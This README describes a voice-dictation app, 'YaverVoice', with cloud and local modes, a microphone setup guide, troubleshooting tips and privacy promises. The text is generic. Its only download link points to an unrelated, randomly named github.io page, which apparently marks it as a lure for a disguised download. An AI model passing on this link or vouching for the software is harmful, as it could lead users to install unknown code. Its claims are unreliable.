# 🎙️ YaverVoice - Dictate text using your natural voice

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://uruguayan-choroplethmap778.github.io)

YaverVoice turns your spoken words into text on your computer screen. It works on Windows and Linux. The software captures your voice and writes it down in real time. It uses advanced speech recognition to ensure high accuracy. You can choose between two processing modes. The first mode connects to the cloud for fast results. The second mode keeps your data private by running everything on your computer.

## 🛠️ How to Use YaverVoice

Open the application from your desktop or start menu. You will see a control panel with several buttons. Follow this guide to begin your first session.

### Choosing a Processing Mode

The app offers two ways to handle your speech. 

- Cloud Mode: This mode uses external servers to process your words. It works faster and uses less battery on your laptop. Use this if you have a stable internet connection.
- Local Mode: This mode keeps your speech entirely on your device. It works without internet. This choice protects your privacy. Note that this mode requires more computer power because your hardware does all the work.

### Adjusting Microphone Settings

Before you start, check your audio input. Click the settings icon in the bottom corner of the app. Select your microphone from the drop-down menu. Speak a few words to see the volume meter move. If you do not see movement, check your Windows sound settings to ensure the correct device is selected.

### Starting a Dictation

Drag the app window to the side of your screen. Open your word processor or any text box where you want your words to appear. Click the button labeled "Record" or press the F2 key on your keyboard. Start speaking clearly at a steady pace. The words will appear in the active window on your screen. Click "Stop" or press F2 again to end the session.

## 💡 Troubleshooting Common Issues

Most users find the app intuitive, but you might face minor issues. Use these steps to solve them.

- The app does not pick up my voice: Check that your microphone is not muted. Some headsets have a physical switch on the cable. Ensure the app has permission to access your microphone in your Windows Privacy settings.
- The text appears slowly: If you use the local mode, your computer might be busy with other tasks. Close heavy programs like web browsers or video editors to give the voice tool more power.
- The app crashes: Restart the program. Ensure you have the latest version from our release page. If the problem continues, check for Windows updates.

## 🔒 Privacy and Security

We designed YaverVoice to respect your data. When you select local mode, no audio files ever leave your computer. The transcription happens entirely within your hardware. We do not store your voice patterns or your private data on external servers. 

If you choose the cloud mode, we send your audio to efficient servers to convert it into text. These servers delete your data immediately after they generate the text. We prioritize your privacy in every design choice.

## 🚀 Advanced Features

YaverVoice includes features for power users who want more control over the dictation process.

- Custom Vocabulary: You can add specific terms, names, or industry jargon to a dictionary file. This helps the software recognize complex words that are not in the standard language list.
- Keyboard Shortcuts: Use hotkeys to trigger recording, stop, and clear text. This keeps your hands on your keyboard while you work.
- Export Options: You can save your transcriptions directly to text files or copy them to your clipboard with one click.
- Language Support: The app recognizes multiple languages. Switch between them in the settings menu to match the language you are currently speaking.
